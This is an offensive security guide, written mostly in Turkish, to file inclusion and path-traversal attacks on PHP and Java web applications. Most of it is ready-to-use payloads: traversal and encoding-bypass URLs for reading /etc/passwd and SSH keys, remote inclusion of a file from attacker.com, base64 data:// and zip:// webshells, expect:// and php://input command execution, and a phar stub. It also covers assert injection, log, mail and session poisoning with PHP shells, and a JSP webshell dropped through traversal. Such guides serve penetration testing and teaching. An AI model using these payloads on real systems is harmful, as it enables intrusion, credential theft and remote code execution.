# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Dosya uzak bir sunucudan yüklenir (En iyi: Siz kodu yazarsınız ve sunucu onu çalıştırır). In php this is **disabled** by default (**allow_url_include**).\
**Local File Inclusion (LFI):** Sunucu yerel bir dosya yükler.

Zafiyet, kullanıcının sunucunun yükleyeceği dosyayı bir şekilde kontrol edebilmesi durumunda ortaya çıkar.

Zafiyetli **PHP fonksiyonları**: require, require_once, include, include_once

Bu zafiyeti istismar etmek için ilginç bir araç: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Birden fazla \*nix LFI listesini birleştirip daha fazla yol ekleyerek bunu oluşturdum:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to add `../../../../../`

Dosya /etc/password'ı bulmak için çeşitli teknikler kullanan bir liste (zafiyetin olup olmadığını kontrol etmek için) burada bulunabilir [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Farklı wordlists'lerin birleşimi:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to remove `C:/` and add `../../../../../`

Dosya /boot.ini'yi bulmak için çeşitli teknikler kullanan bir liste (zafiyetin olup olmadığını kontrol etmek için) burada bulunabilir [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Linux'un LFI listesine bakın.

## Temel LFI ve bypasses

Tüm örnekler Local File Inclusion içindir ancak Remote File Inclusion'a da uygulanabilir (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences özyinelemeli olmayan şekilde kaldırıldı
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass: sağlanan dizenin sonuna eklenen ekstra karakterleri atlatma (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu, **PHP 5.4'ten beri çözüldü**

### **Kodlama**

Standart olmayan kodlamalar kullanabilirsiniz; örneğin çift URL encode (ve diğerleri):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Mevcut klasörden

Belki back-end klasör yolunu kontrol ediyordur:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucuda Dosya Sistemi Dizinlerini Keşfetme

Sunucunun dosya sistemi, sadece dosyaları değil dizinleri de belirlemek için belirli teknikler kullanılarak özyinelemeli olarak keşfedilebilir. Bu süreç, dizin derinliğinin belirlenmesini ve belirli klasörlerin varlığının sorgulanmasını içerir. Bunu başarmak için ayrıntılı bir yöntem aşağıdadır:

1. **Dizin Derinliğini Belirleme:** Bulunduğunuz dizinin derinliğini, `/etc/passwd` dosyasını başarıyla getirerek (sunucu Linux tabanlı ise geçerlidir) belirleyin. Örnek bir URL aşağıdaki gibi yapılandırılabilir; bu, derinliğin üç olduğunu gösterir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Klasörleri Sorgula:** Şüphelenilen klasörün adını (ör. `private`) URL'ye ekleyin, sonra `/etc/passwd`'e geri gidin. Ek dizin seviyesi derinliği bir artırmayı gerektirir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Sonuçları Yorumlama:** Sunucunun yanıtı klasörün var olup olmadığını gösterir:
- **Hata / Çıktı Yok:** `private` klasörü belirtilen konumda muhtemelen yoktur.
- **`/etc/passwd` içeriği:** `private` klasörünün varlığı doğrulanır.
4. **Yinelemeli Keşif:** Bulunan klasörler, aynı teknik veya geleneksel Local File Inclusion (LFI) yöntemleri kullanılarak alt dizinler veya dosyalar için daha fazla sorgulanabilir.

Dosya sistemindeki farklı konumlardaki dizinleri keşfetmek için payload'u buna göre ayarlayın. Örneğin, `/var/www/` içinde bir `private` dizini olup olmadığını kontrol etmek için (mevcut dizinin derinliği 3 kabul edilirse) şunu kullanın:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation, web uygulamalarında dosya yollarını manipüle etmek için kullanılan bir yöntemdir. Genellikle dosya yollarının sonuna ek karakterler ekleyen bazı güvenlik önlemlerini atlatarak erişimi kısıtlanmış dosyalara ulaşmak için kullanılır. Amaç, güvenlik önlemi tarafından değiştirildiğinde bile hedef dosyaya işaret eden bir dosya yolu oluşturmaktır.

In PHP, çeşitli dosya yolu gösterimleri dosya sistemi doğası gereği eşdeğer kabul edilebilir. Örneğin:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, ve `/etc/passwd/` aynı yol olarak işlem görür.
- Son 6 karakter `passwd` olduğunda, sonuna `/` eklemek (yani `passwd/` yapmak) hedeflenen dosyayı değiştirmez.
- Benzer şekilde, bir dosya yoluna `.php` eklendiğinde (ör. `shellcode.php`), sonuna `/.` eklemek erişilen dosyayı değiştirmez.

Aşağıdaki örnekler, hassas içeriği (kullanıcı hesap bilgileri) nedeniyle sık hedef olan `/etc/passwd` dosyasına erişmek için path truncation kullanımını göstermektedir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda gerekli traversals sayısı yaklaşık 2027 civarında olabilir, ancak bu sayı sunucunun yapılandırmasına bağlı olarak değişebilir.

- **Nokta Segmentleri ve Ek Karakterlerin Kullanımı**: Traversal sequences (`../`) ekstra nokta segmentleri ve karakterlerle birleştirilerek dosya sisteminde gezinmek için kullanılabilir; bu, sunucunun eklediği dizeleri etkili şekilde yok saymayı sağlar.
- **Gerekli Traversal Sayısını Belirleme**: Deneme-yanılma yoluyla, kök dizine ve ardından `/etc/passwd`'e ulaşmak için gereken tam `../` sayısı bulunabilir; bu şekilde `.php` gibi eklenen dizeler etkisiz hale getirilir ve hedef yol (`/etc/passwd`) korunur.
- **Sahte Bir Dizinle Başlamak**: Yolun, `a/` gibi var olmayan bir dizinle başlatılması yaygın bir uygulamadır. Bu teknik önlem olarak veya sunucunun yol ayrıştırma mantığının gereksinimlerini karşılamak için kullanılır.

path truncation techniques kullanılırken, sunucunun yol ayrıştırma davranışı ve dosya sistemi yapısı iyi anlaşılmalıdır. Her senaryo farklı bir yaklaşım gerektirebilir ve en etkili yöntemi bulmak için genellikle test yapmak gerekir.

**Bu zafiyet PHP 5.3'te giderildi.**

### **Filtre atlatma hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php'de bu varsayılan olarak devre dışı bırakılmıştır çünkü **`allow_url_include`** **Off**'tur. Çalışması için **On** olmalıdır ve bu durumda sunucunuzdan bir PHP file'ı include ederek RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Eğer bir sebepten dolayı **`allow_url_include`** **On** ise, fakat PHP dış web sayfalarına erişimi **filtering** ile engelliyorsa, [bu gönderiye](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) göre, örneğin data protocol ile base64 kullanarak b64 PHP kodunu decode edip RCE elde edebilirsiniz:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Önceki kodda, son `+.txt` eklendi çünkü saldırganın `.txt` ile biten bir string'e ihtiyacı vardı; bu yüzden string onunla biter ve b64 decode işleminden sonra o kısım sadece çöp döndürür ve gerçek PHP code dahil edilir (ve dolayısıyla, çalıştırılır).

Başka bir örnek **`php://` protokolünü kullanmayan** şöyle olurdu:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Kök öğesi

Python'da şöyle bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Eğer kullanıcı **`file_name`**'e **mutlak bir yol** gönderirse, **önceki yol sadece kaldırılır**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)'a göre amaçlanan davranıştır:

> Eğer bir bileşen mutlak bir yol ise, önceki tüm bileşenler atılır ve birleştirme mutlak yol bileşeninden devam eder.

## Java List Directories

Görünüşe göre Java'da bir Path Traversal varsa ve bir dosya yerine **bir dizin isterseniz**, dizinin **listesi döndürülür**. Bu diğer dillerde olmayacaktır (afaik).

## Top 25 parameters

İşte local file inclusion (LFI) zafiyetlerine açık olabilecek Top 25 parametrenin listesi (kaynak: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI PHP wrapper'ları ve protokoller kullanımı

### php://filter

PHP filtreleri, veriler okunup yazılmadan önce veri üzerinde temel **değişiklik işlemleri** gerçekleştirmeye izin verir. Filtrelerin 5 kategorisi vardır:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verideki tagleri kaldırır (everything between "<" and ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Farklı bir kodlamaya dönüştürür(`convert.iconv.<input_enc>.<output_enc>`). Desteklenen tüm kodlamaların **listesini** almak için konsolda şunu çalıştırın: `iconv -l`

> [!WARNING]
> `convert.iconv.*` dönüşüm filtresini kötüye kullanarak **rastgele metin üretebilirsiniz**, bu da rastgele metin yazmak veya include gibi bir fonksiyonun rastgele metin işlemesine imkan tanıyabilir. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: İçeriği sıkıştırır (useful if exfiltrating a lot of info)
- `zlib.inflate`: Veriyi açar
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Kullanımdan kaldırıldı
- `mdecrypt.*` : Kullanımdan kaldırıldı
- Other Filters
- PHP'de `var_dump(stream_get_filters());` çalıştırdığınızda birkaç **beklenmeyen filtre** bulabilirsiniz:
- `consumed`
- `dechunk`: HTTP chunked encoding'i tersine çevirir
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" kısmı büyük/küçük harf duyarsızdır

### php filters'ı oracle olarak kullanarak herhangi dosyaları okuma

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) çıktının sunucudan geri verilmediği durumlarda yerel bir dosyayı okumak için bir teknik önerir. Bu teknik, php filters kullanılarak yapılan **boolean exfiltration of the file (char by char) using php filters** as oracle prensibine dayanır. Bunun nedeni, php filters'ın bir metni PHP'nin bir istisna fırlatacak kadar büyük hale getirebilmek için kullanılabilmesidir.

Orijinal yazıda tekniğin detaylı açıklaması bulunmakla birlikte, işte kısa bir özet:

- Codec **`UCS-4LE`** kullanılarak metnin baştaki karakteri öne alınır ve string boyutunun üssel olarak artması sağlanır.
- Bu, ilk harf doğru tahmin edildiğinde php'nin bir **error** tetikleyeceği kadar büyük bir **text so big when the initial letter is guessed correctly** üretmek için kullanılacaktır.
- **dechunk** filtresi **remove everything if the first char is not an hexadecimal** davranışı gösterir, böylece ilk karakterin hex olup olmadığını anlayabiliriz.
- Bu, öncekiyle (ve tahmin edilen harfe bağlı diğer filtrelerle) birleştirildiğinde, metnin başındaki bir harfi, onu bir onaltılık karakter olmaktan çıkaracak kadar dönüşüm uyguladığımızda fark ederek tahmin etmemizi sağlar. Çünkü eğer hex ise dechunk onu silmez ve başlangıç bombası php hatası üretir.
- Codec **convert.iconv.UNICODE.CP930** her harfi bir sonrakine dönüştürür (yani bu codec'ten sonra: a -> b). Bu, örneğin ilk harfin `a` olup olmadığını keşfetmemizi sağlar; çünkü bu codec'i 6 kez uygularsak a->b->c->d->e->f->g olur ve harf artık bir onaltılık karakter olmaz, dolayısıyla dechunk onu silmez ve başlangıç bombasıyla çoğaldığı için php hatası tetiklenir.
- Başta **rot13** gibi dönüşümler kullanılarak n, o, p, q, r gibi diğer karakterleri leak etmek mümkündür (ve diğer codec'ler diğer harfleri hex aralığına taşımak için kullanılabilir).
- Başlangıç karakteri bir sayıysa, sayıyı leak etmek için önce base64 encode edip ilk iki harfi leak etmek gerekir.
- Son sorun, **how to leak more than the initial letter** görmektir. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** gibi order memory filtreleri kullanarak karakterlerin sırasını değiştirmek ve metnin diğer harflerini ilk pozisyona getirmek mümkündür.
- Ve daha fazla veri elde edebilmek için fikir, **generate 2 bytes of junk data at the beginning** ile başta 2 byte çöp veri oluşturmak (convert.iconv.UTF16.UTF16 ile), sonra **UCS-4LE** uygulayarak bunun **pivot with the next 2 bytes** yapmasını sağlamak ve **d**elete the data until the junk data (bu, ilk metindeki ilk 2 bytı kaldıracaktır). Bu işlemi leak etmek istediğiniz biti elde edene kadar tekrarlayın.

Yazıda bu işlemi otomatikleştiren bir araç da leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Bu wrapper, process'un open olan file descriptors'larına erişmeyi sağlar. Açık dosyaların içeriğini exfiltrate etmek için potansiyel olarak yararlıdır:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ayrıca **php://stdin, php://stdout and php://stderr** kullanarak **file descriptors 0, 1 and 2**'ye sırasıyla erişebilirsiniz (bir saldırıda bunun nasıl işe yarayabileceğini bilmiyorum)

### zip:// and rar://

İçinde PHPShell bulunan bir Zip veya Rar dosyası yükleyin ve ona erişin.\
rar protokolünü kötüye kullanabilmek için **özellikle etkinleştirilmesi gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Bu protokolün php yapılandırmaları **`allow_url_open`** ve **`allow_url_include`** tarafından kısıtlandığını unutmayın

### expect://

Expect etkinleştirilmiş olmalıdır. Bunu kullanarak kod çalıştırabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Payload'unuzu POST parametrelerinde belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyası, bir web uygulaması dosyaları yüklemek için `include` gibi fonksiyonlardan yararlandığında PHP kodu çalıştırmak için kullanılabilir. Aşağıda verilen PHP kodu parçası bir `.phar` dosyasının oluşturulmasını göstermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasını derlemek için, aşağıdaki komut çalıştırılmalıdır:
```bash
php --define phar.readonly=0 create_path.php
```
Çalıştırıldığında `test.phar` adlı bir dosya oluşturulur; bu dosya Local File Inclusion (LFI) açıklarını istismar etmek için kullanılabilir.

LFI yalnızca içindeki PHP kodunu çalıştırmadan dosya okuma yapıyorsa — `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi fonksiyonlar aracılığıyla — deserialization açığının istismarı denenebilir. Bu zafiyet, `phar` protokolünü kullanarak dosya okunmasıyla ilişkilidir.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

PHP'de php filter'larını destekleyen herhangi bir dosya okuması istismar edilerek RCE elde etmek mümkün oldu. Ayrıntılı açıklama [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Çok kısa özet: PHP heap'inde bir **3 byte overflow** kullanılarak belirli boyuttaki serbest chunk zinciri değiştirildi ve böylece herhangi bir adrese istediğiniz her şeyi yazmak mümkün oldu; bu amaçla `system`'i çağıran bir hook eklendi.\
Daha fazla php filter'ı suistimal ederek belirli boyutlarda chunk allocate etmek mümkün oldu.

### Daha fazla protokol

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Belleğe veya geçici bir dosyaya yazma (file inclusion attack açısından bunun nasıl yararlı olabileceğinden emin değilim)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Yerel dosya sistemine erişim
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL'lerine erişim
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL'lerine erişim
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Sıkıştırma akışları
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Desenle eşleşen yol adlarını bulma (yazdırılabilir hiçbir şey döndürmüyor, bu yüzden burada pek kullanışlı değil)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ses akışları (keyfi dosyaları okumak için kullanışlı değil)

## PHP'nin 'assert' ile LFI

PHP'de 'assert' fonksiyonuyla çalışırken Local File Inclusion (LFI) riskleri özellikle yüksektir; çünkü 'assert' string içindeki kodu çalıştırabilir. Bu, özellikle '..' gibi directory traversal karakterleri içeren girdiler kontrol edilip düzgün temizlenmiyorsa problem yaratır.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, traversal'ı durdurmayı amaçlasa da istemeden code injection için bir vektör oluşturuyor. Dosya içeriğini okumak için bunu exploit etmek isteyen bir saldırgan şunu kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer şekilde, rastgele sistem komutlarını çalıştırmak için şu kullanılabilir:
```plaintext
' and die(system("id")) or '
```
Bu payload'ları **URL-encode** etmek önemlidir.

## PHP Blind Path Traversal

> [!WARNING]
> Bu teknik, bir **PHP fonksiyonunun** erişeceği **dosya yolunu** siz **kontrol ettiğiniz** ama dosya içeriğini göremeyeceğiniz durumlarda geçerlidir (ör. basit bir **`file()`** çağrısı gibi) ancak içerik gösterilmez.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Özetle, teknik, dosya içeriğini o kadar **büyük** yapmak için **"UCS-4LE" encoding** kullanır ki dosyayı açan **PHP fonksiyonu** bir **hata** tetikler.

Daha sonra, ilk karakteri leak etmek için **`dechunk`** filtresi, **base64** veya **rot13** gibi diğer filtrelerle birlikte kullanılır ve nihayetinde **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** filtreleri başka karakterleri başa yerleştirmek ve onları leak etmek için kullanılır.

Zayıf olabilecek fonksiyonlar: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar için belirtilen gönderiye bakın!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Sunucu tarafı kodu, yüklenen/işlenen dosyaların hedef yolunu kullanıcı kontrollü veri (ör. bir filename veya URL) kullanarak canonicalise ve validate etmeden oluşturduğunda, `..` segmentleri ve absolute path'ler hedeflenen dizinden kaçabilir ve arbitrary file write'e neden olabilir. Payload'ı web-exposed bir dizine koyabiliyorsanız genellikle bir webshell bırakarak yetkisiz RCE elde edersiniz.

Tipik istismar akışı:
- Bir endpoint veya background worker içinde path/filename kabul eden ve içeriği diske yazan bir write primitive tespit edin (ör. message-driven ingestion, XML/JSON command handlers, ZIP extractors, vb.).
- Web-exposed dizinleri belirleyin. Yaygın örnekler:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Hedef depolama dizininden webroot'a çıkacak şekilde bir traversal path oluşturun ve webshell içeriğinizi ekleyin.
- Bıraktığınız payload'a tarayıcıyla gidin ve komutları çalıştırın.

Notlar:
- Yazmayı gerçekleştiren vulnerable servis non-HTTP porta dinliyor olabilir (ör. TCP 4004'te bir JMF XML listener). Ana web portalı (farklı port) daha sonra payload'ınızı serve edecektir.
- Java stack'lerinde bu dosya yazımları genellikle basit `File`/`Paths` concatenation ile uygulanır. Kanonikleştirme/allow-listing eksikliği temel hata nedenidir.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- Kanonik bir yola çözümleyin ve bunun izin verilen (allow-listed) bir temel dizinin alt dizini olduğunu zorunlu kılın.
- `..`, mutlak kök yolları (absolute roots) veya sürücü harfleri (drive letters) içeren herhangi bir yolu reddedin; bunun yerine oluşturulmuş dosya adlarını tercih edin.
- Yazma işlemini düşük ayrıcalıklı bir hesapla çalıştırın ve yazma dizinlerini servis edilen kök dizinlerden ayırın.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Dikkat: **eğer shell için çift tırnak kullanırsanız** tek tırnak yerine, çift tırnaklar "_**quote;**_" stringi için değiştirilecektir, orada **PHP hata fırlatacaktır** ve **başka hiçbir şey yürütülmeyecektir**.
>
> Ayrıca, payload'u **doğru yazdığınızdan** emin olun; aksi halde PHP, log dosyasını yüklemeye çalıştıkça hata verecek ve ikinci bir fırsatınız olmayacaktır.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta ile

**Bir e-posta gönderin** yerel bir hesaba (user@localhost) PHP payload'unuzu içerecek şekilde `<?php echo system($_REQUEST["cmd"]); ?>` ve kullanıcının mailini aşağıdaki gibi bir yol ile include etmeyi deneyin: **`/var/mail/<USERNAME>`** veya **`/var/spool/mail/<USERNAME>`**

### /proc/*/fd/* üzerinden

1. Çok sayıda shells yükleyin (örneğin: 100)  
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) adresini include edin; burada $PID süreç PID'si (brute forced ile bulunabilir) ve $FD file descriptor'dır (o da brute forced ile bulunabilir)

### /proc/self/environ üzerinden

Bir log dosyası gibi, payload'u User-Agent içinde gönderin; bu /proc/self/environ dosyasında yansıtılacaktır.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Yükleme ile

Bir dosya yükleyebiliyorsanız, içine shell payload'unu enjekte edin (ör. : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Dosyanın okunabilirliğini korumak için resimlerin/doc/pdf'lerin metadata'sına enjekte etmek en iyisidir

### ZIP dosyası yüklemesi ile

Sıkıştırılmış bir PHP shell içeren bir ZIP dosyası yükleyin ve erişin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP oturumları üzerinden

Web sitesinin PHP Session (PHPSESSID) kullanıp kullanmadığını kontrol edin
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarına kaydedilir
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Cookie'yi şu değere ayarlayın `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP session file'ını include etmek için LFI'yi kullanın.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh üzerinden

Eğer ssh aktifse hangi kullanıcının kullanıldığını kontrol et (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id_rsa**'ye erişmeyi dene.

### **Üzerinden** **vsftpd** _**günlükleri**_

